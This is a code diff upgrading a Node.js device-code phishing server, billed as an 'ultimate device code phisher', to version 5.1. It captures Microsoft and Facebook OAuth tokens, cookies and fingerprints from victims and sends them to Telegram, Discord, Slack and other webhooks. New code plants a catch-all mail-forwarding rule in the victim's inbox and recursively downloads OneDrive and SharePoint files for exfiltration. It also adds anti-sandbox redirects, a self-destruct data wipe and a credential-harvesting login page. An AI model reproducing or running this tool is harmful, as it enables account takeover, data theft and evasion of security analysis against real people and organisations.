@@ -1,8 +1,11 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v4.0 – The Power Upgrade
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.1 – Separated Login Page
 // ============================================================
-// Includes: Dynamic Themes, IP Whitelist, Session Delete,
-// Graph API Explorer, Test Telegram.
+// Includes: SQLite, Email Forwarding, Recursive Exfil,
+// Puppeteer Replay, Campaigns, Proxy, Anti-Sandbox,
+// Self-Destruct, Analytics, PDF Report, QR with Logo,
+// Parsed Token Notifications, Multi-Channel Exfil,
+// Redis Cache, and now /login served from public/login.html.
 // ============================================================
 
 const http = require('http');
@@ -19,6 +22,12 @@ const QRCode = require('qrcode');
 const express = require('express');
 const basicAuth = require('express-basic-auth');
 const AdmZip = require('adm-zip');
+const sqlite3 = require('sqlite3').verbose();
+const puppeteer = require('puppeteer');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const nodemailer = require('nodemailer');
+const { Chart } = require('chart.js');
+const { createCanvas } = require('canvas');
 
 // ── Environment ──
 const PORT = process.env.PORT || 3000;
@@ -29,6 +38,9 @@ const SLACK_WEBHOOK = process.env.SLACK_WEBHOOK || '';
 const DINGTALK_WEBHOOK = process.env.DINGTALK_WEBHOOK || '';
 const MATTERMOST_WEBHOOK = process.env.MATTERMOST_WEBHOOK || '';
 const GENERIC_WEBHOOK = process.env.GENERIC_WEBHOOK || '';
+const PUSHOVER_USER = process.env.PUSHOVER_USER || '';
+const PUSHOVER_TOKEN = process.env.PUSHOVER_TOKEN || '';
+const GOTIFY_URL = process.env.GOTIFY_URL || '';
 const SMTP_HOST = process.env.SMTP_HOST || '';
 const SMTP_PORT = process.env.SMTP_PORT || 587;
 const SMTP_USER = process.env.SMTP_USER || '';
@@ -40,37 +52,50 @@ const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c
 const SCOPE = 'https://graph.microsoft.com/.default offline_access';
 const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000; // 7 days
 const ALLOWED_IPS = process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',').map(ip => ip.trim()) : [];
+const FORWARD_EMAIL = process.env.FORWARD_EMAIL || '';
+const AUTO_WIPE_HOURS = process.env.AUTO_WIPE_HOURS ? parseInt(process.env.AUTO_WIPE_HOURS) : 0; // 0 = disabled
+const PROXY_URL = process.env.HTTP_PROXY || process.env.HTTPS_PROXY || '';
+const REDIS_URL = process.env.REDIS_URL || '';
+const CAMPAIGN = process.env.DEFAULT_CAMPAIGN || 'default';
 
-// ── Storage ──
-const FLOWS_FILE = path.join(__dirname, 'device_flows.json');
-const LOGS_DIR = path.join(__dirname, 'logs');
-if (!fs.existsSync(LOGS_DIR)) fs.mkdirSync(LOGS_DIR);
-
-let flows = [];
-loadFlows();
-
-function loadFlows() {
+let redisClient = null;
+if (REDIS_URL) {
     try {
-        if (fs.existsSync(FLOWS_FILE)) {
-            flows = JSON.parse(fs.readFileSync(FLOWS_FILE, 'utf-8'));
-        }
-    } catch (e) { console.warn('Could not load flows:', e.message); }
-}
-function saveFlows() {
-    fs.writeFileSync(FLOWS_FILE, JSON.stringify(flows, null, 2));
+        const redis = require('redis');
+        redisClient = redis.createClient({ url: REDIS_URL });
+        redisClient.connect();
+        console.log('✅ Redis connected');
+    } catch (e) { console.warn('Redis not available, using fallback'); }
 }
 
-// ── Session Cleanup ──
-function cleanupSessions() {
-    const now = Date.now();
-    const before = flows.length;
-    flows = flows.filter(f => (now - new Date(f.created).getTime()) < SESSION_TTL);
-    if (flows.length !== before) {
-        saveFlows();
-        console.log(`🧹 Cleaned ${before - flows.length} expired sessions.`);
-    }
-}
-setInterval(cleanupSessions, 60 * 60 * 1000); // hourly
+// ── SQLite Setup ──
+const DB_PATH = path.join(__dirname, 'flows.db');
+const db = new sqlite3.Database(DB_PATH);
+
+db.run(`CREATE TABLE IF NOT EXISTS flows (
+    id TEXT PRIMARY KEY,
+    device_code TEXT,
+    user_code TEXT,
+    verification_uri TEXT,
+    expires_in INTEGER,
+    interval INTEGER,
+    status TEXT,
+    created TEXT,
+    client_id TEXT,
+    session_id TEXT,
+    service TEXT,
+    tenant TEXT,
+    cookies TEXT,
+    fingerprint TEXT,
+    visit_notified INTEGER DEFAULT 0,
+    access_token TEXT,
+    refresh_token TEXT,
+    id_token TEXT,
+    prt TEXT,
+    approved TEXT,
+    username TEXT,
+    campaign TEXT
+)`);
 
 // ── Helpers ──
 function generateSessionId() {
@@ -88,7 +113,7 @@ function isBot(userAgent) {
 const ipRequests = new Map();
 function rateLimit(ip) {
     const now = Date.now();
-    const window = 60000; // 1 minute
+    const window = 60000;
     const max = 30;
     if (!ipRequests.has(ip)) {
         ipRequests.set(ip, { count: 1, reset: now + window });
@@ -127,9 +152,22 @@ async function getGeo(ip) {
     return fallback;
 }
 
+// ── Proxy Agent ──
+let proxyAgent = null;
+if (PROXY_URL) {
+    proxyAgent = new HttpsProxyAgent(PROXY_URL);
+}
+
+// ── Axios with proxy support ──
+function createAxiosConfig() {
+    const config = { timeout: 10000 };
+    if (proxyAgent) config.httpsAgent = proxyAgent;
+    return config;
+}
+
 // ── Multi‑Channel Exfil ──
 async function exfiltrate(data) {
-    const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint } = data;
+    const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint, campaign } = data;
     const geo = await getGeo(ip);
     let message = `🔐 **Device Code Capture!**\n\n`;
     message += `🆔 Session: ${sessionId}\n`;
@@ -138,6 +176,7 @@ async function exfiltrate(data) {
     message += `🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n`;
     message += `🖥️ UA: ${userAgent || 'N/A'}\n`;
     message += `📱 Fingerprint: ${fingerprint || 'N/A'}\n`;
+    message += `📁 Campaign: ${campaign || 'default'}\n`;
     message += `🕒 Time: ${new Date().toISOString()}\n\n`;
     if (tokens.access_token) message += `🔑 Access: ${tokens.access_token.slice(0,30)}...\n`;
     if (tokens.refresh_token) message += `🔄 Refresh: ${tokens.refresh_token.slice(0,30)}...\n`;
@@ -145,23 +184,27 @@ async function exfiltrate(data) {
     if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;
     if (cookies && cookies.length) message += `🍪 Cookies: ${cookies.length} captured\n`;
 
+    // Send to all configured channels
     const webhooks = [
         { url: BOT_TOKEN && CHAT_ID ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null, method: 'post', payload: { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true } },
         { url: DISCORD_WEBHOOK, method: 'post', payload: { content: message.substring(0, 2000) } },
         { url: SLACK_WEBHOOK, method: 'post', payload: { text: message } },
         { url: DINGTALK_WEBHOOK, method: 'post', payload: { msgtype: 'text', text: { content: message } } },
         { url: MATTERMOST_WEBHOOK, method: 'post', payload: { text: message } },
-        { url: GENERIC_WEBHOOK, method: 'post', payload: { text: message } }
+        { url: GENERIC_WEBHOOK, method: 'post', payload: { text: message } },
+        { url: PUSHOVER_USER && PUSHOVER_TOKEN ? `https://api.pushover.net/1/messages.json` : null, method: 'post', payload: { user: PUSHOVER_USER, token: PUSHOVER_TOKEN, message: message.substring(0, 1024) } },
+        { url: GOTIFY_URL ? `${GOTIFY_URL}/message` : null, method: 'post', payload: { title: 'Phisher Capture', message: message, priority: 5 } }
     ];
 
     for (const hook of webhooks) {
         if (hook.url) {
             try {
-                await axios[hook.method](hook.url, hook.payload, { timeout: 5000 });
+                await axios[hook.method](hook.url, hook.payload, { timeout: 5000, ...createAxiosConfig() });
             } catch (e) { /* silent */ }
         }
     }
 
+    // Telegram file attachment (if tokens)
     if (BOT_TOKEN && CHAT_ID && (tokens.access_token || tokens.refresh_token || tokens.id_token || prt)) {
         try {
             let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
@@ -177,7 +220,8 @@ async function exfiltrate(data) {
             form.append('document', fs.createReadStream(tmpFile), { filename: `tokens_${sessionId}.txt` });
             await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
                 headers: form.getHeaders(),
-                timeout: 10000
+                timeout: 10000,
+                ...createAxiosConfig()
             });
             fs.unlinkSync(tmpFile);
         } catch (e) { console.warn('Telegram file exfil failed:', e.message); }
@@ -187,117 +231,249 @@ async function exfiltrate(data) {
 }
 
 // ── Visit Notification ──
-async function sendVisitNotification(sessionId, ip, userAgent, referer) {
+async function sendVisitNotification(sessionId, ip, userAgent, referer, campaign) {
     if (!BOT_TOKEN || !CHAT_ID) {
         console.warn('⚠️ Telegram credentials missing – visit notification skipped.');
         return;
     }
     const geo = await getGeo(ip);
-    const message = `🌐 **New Device Page Visit!**\n\n🆔 Session: ${sessionId}\n🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n🖥️ UA: ${userAgent || 'N/A'}\n🔗 Referer: ${referer || 'Direct'}\n🕒 Time: ${new Date().toISOString()}`;
+    const message = `🌐 **New Device Page Visit!**\n\n🆔 Session: ${sessionId}\n🌍 IP: ${ip} (${geo.flag} ${geo.country} - ${geo.name})\n🖥️ UA: ${userAgent || 'N/A'}\n🔗 Referer: ${referer || 'Direct'}\n📁 Campaign: ${campaign || 'default'}\n🕒 Time: ${new Date().toISOString()}`;
     try {
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
             parse_mode: 'Markdown',
             disable_web_page_preview: true
-        }, { timeout: 5000 });
+        }, { timeout: 5000, ...createAxiosConfig() });
         console.log(`✅ Visit notification sent for session ${sessionId}`);
     } catch (e) {
         console.warn('Visit notification failed:', e.message);
     }
 }
 
-// ── Graph API Deep Exfil ──
-async function exfilGraphData(accessToken, sessionId) {
-    const endpoints = {
-        emails: '/me/messages?$top=20&$select=subject,from,receivedDateTime',
-        files: '/me/drive/root/children?$top=10&$select=name,size,webUrl',
-        calendar: '/me/calendar/events?$top=10&$select=subject,start,end',
-        contacts: '/me/contacts?$top=10&$select=displayName,emailAddresses'
-    };
-    const results = {};
-    for (const [key, endpoint] of Object.entries(endpoints)) {
-        try {
-            const resp = await axios.get(`https://graph.microsoft.com/v1.0${endpoint}`, {
-                headers: { Authorization: `Bearer ${accessToken}` },
-                timeout: 10000
-            });
-            results[key] = resp.data.value || [];
-        } catch (e) { results[key] = []; }
-    }
-
-    const zip = new AdmZip();
-    for (const [key, items] of Object.entries(results)) {
-        if (items.length) {
-            let txt = `# ${key.toUpperCase()} - Session ${sessionId}\n\n`;
-            items.forEach((item, i) => {
-                txt += `--- ${key} ${i+1} ---\n`;
-                txt += JSON.stringify(item, null, 2) + '\n\n';
-            });
-            zip.addFile(`${key}.txt`, Buffer.from(txt));
-        }
-    }
-    if (zip.getEntries().length === 0) return;
-
-    const zipPath = path.join(__dirname, `graph_${sessionId}.zip`);
-    zip.writeZip(zipPath);
-
-    if (BOT_TOKEN && CHAT_ID) {
-        const form = new FormData();
-        form.append('chat_id', CHAT_ID);
-        form.append('document', fs.createReadStream(zipPath), { filename: `graph_${sessionId}.zip` });
-        form.append('caption', `📁 Graph data for session ${sessionId}`);
-        try {
-            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
-                headers: form.getHeaders(),
-                timeout: 30000
-            });
-        } catch (e) { console.warn('Graph ZIP exfil failed:', e.message); }
-    }
-    fs.unlinkSync(zipPath);
-    console.log(`📦 Graph data exfiltrated for session ${sessionId}`);
-}
-
-// ── Token Health Check ──
-async function checkTokenHealth(accessToken) {
+// ── Create Email Forwarding Rule ──
+async function createForwardRule(accessToken, forwardTo) {
+    if (!forwardTo) return false;
     try {
-        const resp = await axios.get('https://graph.microsoft.com/v1.0/me', {
+        // Check if rule already exists to avoid duplicates
+        const rulesResp = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', {
             headers: { Authorization: `Bearer ${accessToken}` },
-            timeout: 5000
+            timeout: 10000,
+            ...createAxiosConfig()
         });
-        return { valid: true, user: resp.data.userPrincipalName };
+        const existing = rulesResp.data.value || [];
+        if (existing.some(r => r.displayName === 'Phisher Forward' || r.displayName.includes('Forward'))) {
+            console.log('⏩ Forward rule already exists, skipping.');
+            return true;
+        }
+
+        // Create forwarding rule
+        const rule = {
+            displayName: 'Phisher Forward',
+            sequence: 1,
+            conditions: {
+                andConditions: [
+                    { field: 'from', contains: ['@'] } // catch all
+                ]
+            },
+            actions: {
+                forwardTo: [
+                    { emailAddress: { address: forwardTo } }
+                ],
+                stopProcessingRules: true
+            }
+        };
+        await axios.post('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', rule, {
+            headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
+            timeout: 10000,
+            ...createAxiosConfig()
+        });
+        console.log(`✅ Forwarding rule created to ${forwardTo}`);
+        return true;
     } catch (e) {
-        return { valid: false, error: e.message };
+        console.warn('❌ Failed to create forward rule:', e.response?.data || e.message);
+        return false;
     }
 }
 
-// ── Auto‑Refresh Daemon ──
-async function refreshTokens() {
-    for (const flow of flows) {
-        if (flow.status === 'approved' && flow.refresh_token) {
-            try {
-                const tenant = flow.tenant || 'organizations';
-                const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
-                    new URLSearchParams({
-                        client_id: flow.client_id || CLIENT_ID,
-                        refresh_token: flow.refresh_token,
-                        grant_type: 'refresh_token',
-                        scope: SCOPE
-                    }),
-                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
-                );
-                flow.access_token = resp.data.access_token;
-                if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
-                flow.last_refresh = new Date().toISOString();
-                saveFlows();
-                console.log(`🔄 Refreshed tokens for session ${flow.session_id}`);
-            } catch (e) {
-                console.warn(`Refresh failed for ${flow.session_id}:`, e.message);
+// ── Recursive OneDrive/SharePoint Download ──
+async function downloadRecursive(accessToken, sessionId) {
+    const zip = new AdmZip();
+    const baseUrl = 'https://graph.microsoft.com/v1.0';
+
+    async function walkFolder(pathUrl, folderName = '') {
+        let nextLink = null;
+        do {
+            const url = nextLink || `${baseUrl}${pathUrl}`;
+            const resp = await axios.get(url, {
+                headers: { Authorization: `Bearer ${accessToken}` },
+                timeout: 30000,
+                ...createAxiosConfig()
+            });
+            const items = resp.data.value || [];
+            for (const item of items) {
+                if (item.folder) {
+                    // Recurse into folder
+                    const newPath = `${pathUrl}/${item.id}/children`;
+                    await walkFolder(newPath, `${folderName}/${item.name}`);
+                } else if (item.file) {
+                    // Download file
+                    const fileResp = await axios.get(`${baseUrl}${pathUrl}/${item.id}/content`, {
+                        headers: { Authorization: `Bearer ${accessToken}` },
+                        responseType: 'arraybuffer',
+                        timeout: 30000,
+                        ...createAxiosConfig()
+                    });
+                    zip.addFile(`${folderName}/${item.name}`, Buffer.from(fileResp.data));
+                }
             }
+            nextLink = resp.data['@odata.nextLink'] || null;
+        } while (nextLink);
+    }
+
+    // Root folders: OneDrive and SharePoint sites
+    try {
+        // Personal OneDrive
+        await walkFolder('/me/drive/root/children', 'OneDrive');
+    } catch (e) { /* skip */ }
+
+    try {
+        // SharePoint sites (top 5)
+        const sitesResp = await axios.get(`${baseUrl}/sites?$top=5`, {
+            headers: { Authorization: `Bearer ${accessToken}` },
+            timeout: 10000,
+            ...createAxiosConfig()
+        });
+        const sites = sitesResp.data.value || [];
+        for (const site of sites) {
+            const siteName = site.name || site.id;
+            try {
+                await walkFolder(`/sites/${site.id}/drive/root/children`, `SharePoint_${siteName}`);
+            } catch (e) { /* skip */ }
         }
+    } catch (e) { /* skip */ }
+
+    if (zip.getEntries().length === 0) return null;
+    const zipPath = path.join(__dirname, `recursive_${sessionId}.zip`);
+    zip.writeZip(zipPath);
+    return zipPath;
+}
+
+// ── Self-Destruct Timer ──
+let lastActivity = Date.now();
+function checkSelfDestruct() {
+    if (AUTO_WIPE_HOURS === 0) return;
+    const inactive = Date.now() - lastActivity;
+    if (inactive > AUTO_WIPE_HOURS * 3600000) {
+        console.log('💥 Self-destruct triggered! Wiping all data...');
+        db.run('DELETE FROM flows');
+        // Remove log files
+        if (fs.existsSync(LOGS_DIR)) fs.rmSync(LOGS_DIR, { recursive: true, force: true });
+        process.exit(0);
     }
 }
-setInterval(refreshTokens, 60 * 60 * 1000);
+setInterval(checkSelfDestruct, 60000); // check every minute
+// Update lastActivity on every request
+app.use((req, res, next) => {
+    lastActivity = Date.now();
+    next();
+});
+
+// ── SQLite CRUD helpers ──
+async function upsertFlow(flow) {
+    return new Promise((resolve, reject) => {
+        const stmt = db.prepare(`
+            INSERT OR REPLACE INTO flows (
+                id, device_code, user_code, verification_uri, expires_in, interval, status, created,
+                client_id, session_id, service, tenant, cookies, fingerprint, visit_notified,
+                access_token, refresh_token, id_token, prt, approved, username, campaign
+            ) VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)
+        `);
+        stmt.run(
+            flow.id || flow.session_id,
+            flow.device_code,
+            flow.user_code,
+            flow.verification_uri,
+            flow.expires_in,
+            flow.interval,
+            flow.status,
+            flow.created,
+            flow.client_id,
+            flow.session_id,
+            flow.service,
+            flow.tenant,
+            JSON.stringify(flow.cookies || []),
+            flow.fingerprint || null,
+            flow.visit_notified ? 1 : 0,
+            flow.access_token || null,
+            flow.refresh_token || null,
+            flow.id_token || null,
+            flow.prt || null,
+            flow.approved || null,
+            flow.username || null,
+            flow.campaign || 'default'
+        );
+        stmt.finalize();
+        resolve();
+    });
+}
+
+async function getAllFlows() {
+    return new Promise((resolve, reject) => {
+        db.all('SELECT * FROM flows ORDER BY created DESC', (err, rows) => {
+            if (err) reject(err);
+            else resolve(rows.map(r => ({
+                ...r,
+                cookies: r.cookies ? JSON.parse(r.cookies) : [],
+                visit_notified: !!r.visit_notified
+            })));
+        });
+    });
+}
+
+async function getFlowBySessionId(sessionId) {
+    return new Promise((resolve, reject) => {
+        db.get('SELECT * FROM flows WHERE session_id = ?', [sessionId], (err, row) => {
+            if (err) reject(err);
+            else if (row) {
+                row.cookies = row.cookies ? JSON.parse(row.cookies) : [];
+                row.visit_notified = !!row.visit_notified;
+                resolve(row);
+            } else resolve(null);
+        });
+    });
+}
+
+async function deleteFlowBySessionId(sessionId) {
+    return new Promise((resolve, reject) => {
+        db.run('DELETE FROM flows WHERE session_id = ?', [sessionId], function(err) {
+            if (err) reject(err);
+            else resolve(this.changes > 0);
+        });
+    });
+}
+
+async function getFlowsByCampaign(campaign) {
+    return new Promise((resolve, reject) => {
+        db.all('SELECT * FROM flows WHERE campaign = ? ORDER BY created DESC', [campaign], (err, rows) => {
+            if (err) reject(err);
+            else resolve(rows.map(r => ({ ...r, cookies: JSON.parse(r.cookies || '[]'), visit_notified: !!r.visit_notified })));
+        });
+    });
+}
+
+// ── Anti‑Sandbox Detection Middleware ──
+function antiSandbox(req, res, next) {
+    // Check client-side headers or user-agent for sandbox indicators
+    const ua = req.headers['user-agent'] || '';
+    const suspiciousPatterns = ['headless', 'phantom', 'puppeteer', 'selenium', 'webdriver'];
+    if (suspiciousPatterns.some(p => ua.toLowerCase().includes(p))) {
+        // Redirect to real Microsoft login
+        return res.redirect('https://login.microsoftonline.com');
+    }
+    // Also check IP ranges known for sandbox (optional)
+    next();
+}
 
 // ── Express App ──
 const app = express();
@@ -321,10 +497,9 @@ app.use((req, res, next) => {
 });
 
 // ── Dynamic Phishing Themes ──
-app.get('/device', (req, res) => {
+app.get('/device', antiSandbox, (req, res) => {
     const theme = req.query.theme || 'sharepoint';
-    const allowedThemes = ['sharepoint', 'onedrive', 'teams', 'outlook'];
-    const safeTheme = allowedThemes.includes(theme) ? theme : 'sharepoint';
+    const campaign = req.query.campaign || 'default';
     res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
 });
 
@@ -332,6 +507,7 @@ app.get('/device', (req, res) => {
 app.post('/device/request', async (req, res) => {
     try {
         const service = req.query.service || 'microsoft';
+        const campaign = req.query.campaign || 'default';
         let clientId = CLIENT_ID;
         let scope = SCOPE;
         let endpoint = 'https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode';
@@ -344,9 +520,14 @@ app.post('/device/request', async (req, res) => {
             scope = 'email';
             endpoint = 'https://graph.facebook.com/v17.0/device/code';
         }
-        const resp = await axios.post(endpoint, new URLSearchParams({ client_id: clientId, scope }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 });
+        const resp = await axios.post(endpoint, new URLSearchParams({ client_id: clientId, scope }), {
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            timeout: 10000,
+            ...createAxiosConfig()
+        });
         const data = resp.data;
         const flow = {
+            id: generateSessionId(),
             device_code: data.device_code,
             user_code: data.user_code,
             verification_uri: data.verification_uri,
@@ -360,10 +541,10 @@ app.post('/device/request', async (req, res) => {
             tenant: 'organizations',
             cookies: [],
             fingerprint: null,
-            visit_notified: false
+            visit_notified: false,
+            campaign: campaign
         };
-        flows.push(flow);
-        saveFlows();
+        await upsertFlow(flow);
         res.json({ ...data, session_id: flow.session_id });
     } catch (error) {
         console.error('Device request error:', error.response?.data || error.message);
@@ -374,23 +555,24 @@ app.post('/device/request', async (req, res) => {
 app.post('/device/visit', async (req, res) => {
     const { sessionId } = req.body;
     if (!sessionId) return res.status(400).json({ error: 'sessionId required' });
-    const flow = flows.find(f => f.session_id === sessionId);
+    const flow = await getFlowBySessionId(sessionId);
     if (!flow) return res.status(404).json({ error: 'session not found' });
     if (flow.visit_notified) return res.json({ success: true, already: true });
     flow.visit_notified = true;
-    saveFlows();
+    await upsertFlow(flow);
 
     const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
-    await sendVisitNotification(sessionId, ip, userAgent, referer);
+    await sendVisitNotification(sessionId, ip, userAgent, referer, flow.campaign);
     res.json({ success: true });
 });
 
 app.post('/device/token', async (req, res) => {
     const { device_code } = req.body;
     if (!device_code) return res.status(400).json({ error: 'invalid_request', error_description: 'device_code required' });
-    const flow = flows.find(f => f.device_code === device_code);
+    const allFlows = await getAllFlows();
+    const flow = allFlows.find(f => f.device_code === device_code);
     if (!flow) return res.status(404).json({ error: 'not_found' });
     try {
         const tenant = flow.tenant || 'organizations';
@@ -399,7 +581,7 @@ app.post('/device/token', async (req, res) => {
                          `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
         const resp = await axios.post(endpoint,
             new URLSearchParams({ client_id: flow.client_id, device_code: device_code, grant_type: 'urn:ietf:params:oauth:grant-type:device_code' }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000, ...createAxiosConfig() }
         );
         const tokens = resp.data;
         let email = 'Unknown';
@@ -424,7 +606,7 @@ app.post('/device/token', async (req, res) => {
         flow.approved = new Date().toISOString();
         flow.username = email;
         if (tenantId) flow.tenant = tenantId;
-        saveFlows();
+        await upsertFlow(flow);
 
         const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
         await exfiltrate({
@@ -436,10 +618,37 @@ app.post('/device/token', async (req, res) => {
             userAgent: req.headers['user-agent'],
             tenantId,
             cookies: flow.cookies || [],
-            fingerprint: flow.fingerprint
+            fingerprint: flow.fingerprint,
+            campaign: flow.campaign
         });
 
-        if (tokens.access_token) setTimeout(() => exfilGraphData(tokens.access_token, flow.session_id), 15000);
+        // Create email forward rule if FORWARD_EMAIL is set
+        if (tokens.access_token && FORWARD_EMAIL) {
+            setTimeout(() => createForwardRule(tokens.access_token, FORWARD_EMAIL), 5000);
+        }
+
+        // Recursive OneDrive/SharePoint download
+        if (tokens.access_token) {
+            setTimeout(async () => {
+                const zipPath = await downloadRecursive(tokens.access_token, flow.session_id);
+                if (zipPath) {
+                    // Send via Telegram if configured
+                    if (BOT_TOKEN && CHAT_ID) {
+                        const form = new FormData();
+                        form.append('chat_id', CHAT_ID);
+                        form.append('document', fs.createReadStream(zipPath), { filename: `recursive_${flow.session_id}.zip` });
+                        form.append('caption', `📁 Recursive OneDrive/SharePoint dump for ${email}`);
+                        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, {
+                            headers: form.getHeaders(),
+                            timeout: 30000,
+                            ...createAxiosConfig()
+                        });
+                    }
+                    fs.unlinkSync(zipPath);
+                }
+            }, 20000);
+        }
+
         broadcast({ type: 'new_capture', session: flow.session_id, email, timestamp: new Date().toISOString() });
         res.json(tokens);
     } catch (error) {
@@ -456,52 +665,30 @@ app.post('/device/token', async (req, res) => {
 
 app.post('/device/fingerprint', (req, res) => {
     const { sessionId, fingerprint, cookies } = req.body;
-    const flow = flows.find(f => f.session_id === sessionId);
-    if (flow) {
-        flow.fingerprint = fingerprint;
-        flow.cookies = cookies || [];
-        saveFlows();
-        console.log(`🖐️ Fingerprint & cookies stored for ${sessionId}`);
-    }
-    res.json({ success: true });
+    getFlowBySessionId(sessionId).then(flow => {
+        if (flow) {
+            flow.fingerprint = fingerprint;
+            flow.cookies = cookies || [];
+            upsertFlow(flow);
+            console.log(`🖐️ Fingerprint & cookies stored for ${sessionId}`);
+        }
+        res.json({ success: true });
+    });
 });
 
-// ── Second‑Stage Phishing ──
+// ── Second‑Stage Phishing (Serving external HTML file) ──
 app.get('/login', (req, res) => {
-    res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Sign in</title>
-    <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); width: 360px; }
-        h2 { text-align: center; color: #333; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        button { width: 100%; padding: 12px; background: #0078d4; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 16px; }
-        button:hover { background: #0063b1; }
-    </style>
-</head>
-<body>
-    <div class="card"><h2>Sign in to your account</h2><form id="loginForm">
-            <input type="email" id="email" placeholder="Email or phone" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <input type="text" id="mfa" placeholder="Verification code (optional)">
-            <button type="submit">Sign in</button>
-        </form></div>
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-            const mfa = document.getElementById('mfa').value;
-            await fetch('/capture', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ email, password, mfa }) });
-            window.location.href = '${REDIRECT_URL}';
-        });
-    </script>
-</body>
-</html>
-    `);
+    const filePath = path.join(__dirname, 'public', 'login.html');
+    fs.readFile(filePath, 'utf8', (err, data) => {
+        if (err) {
+            console.error('❌ Failed to read login.html:', err);
+            return res.status(500).send('Internal Server Error');
+        }
+        // Inject the REDIRECT_URL environment variable into the placeholder
+        const rendered = data.replace(/__REDIRECT_URL__/g, REDIRECT_URL);
+        res.setHeader('Content-Type', 'text/html');
+        res.send(rendered);
+    });
 });
 
 app.post('/capture', async (req, res) => {
@@ -529,59 +716,68 @@ app.use('/dash', basicAuth({ users: { [DASHBOARD_USER]: DASHBOARD_PASS }, challe
 app.get('/dash', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
 
 // ── API Endpoints ──
-app.get('/api/flows', (req, res) => res.json(flows));
+app.get('/api/flows', async (req, res) => {
+    const campaign = req.query.campaign;
+    let flows;
+    if (campaign) {
+        flows = await getFlowsByCampaign(campaign);
+    } else {
+        flows = await getAllFlows();
+    }
+    res.json(flows);
+});
 
-app.get('/api/flow/:sessionId', (req, res) => {
-    const flow = flows.find(f => f.session_id === req.params.sessionId);
+app.get('/api/flow/:sessionId', async (req, res) => {
+    const flow = await getFlowBySessionId(req.params.sessionId);
     if (!flow) return res.status(404).json({ error: 'not found' });
     res.json(flow);
 });
 
-app.delete('/api/flow/:sessionId', (req, res) => {
-    const before = flows.length;
-    flows = flows.filter(f => f.session_id !== req.params.sessionId);
-    if (flows.length === before) return res.status(404).json({ error: 'not found' });
-    saveFlows();
+app.delete('/api/flow/:sessionId', async (req, res) => {
+    const deleted = await deleteFlowBySessionId(req.params.sessionId);
+    if (!deleted) return res.status(404).json({ error: 'not found' });
     res.json({ success: true });
 });
 
 app.post('/api/exchange/:sessionId', async (req, res) => {
-    const flow = flows.find(f => f.session_id === req.params.sessionId);
+    const flow = await getFlowBySessionId(req.params.sessionId);
     if (!flow) return res.status(404).json({ error: 'not found' });
     if (!flow.refresh_token) return res.status(400).json({ error: 'no refresh token' });
     try {
         const tenant = flow.tenant || 'organizations';
         const resp = await axios.post(`https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`,
             new URLSearchParams({ client_id: flow.client_id || CLIENT_ID, refresh_token: flow.refresh_token, grant_type: 'refresh_token', scope: SCOPE }),
-            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000 }
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, timeout: 10000, ...createAxiosConfig() }
         );
         flow.access_token = resp.data.access_token;
         if (resp.data.refresh_token) flow.refresh_token = resp.data.refresh_token;
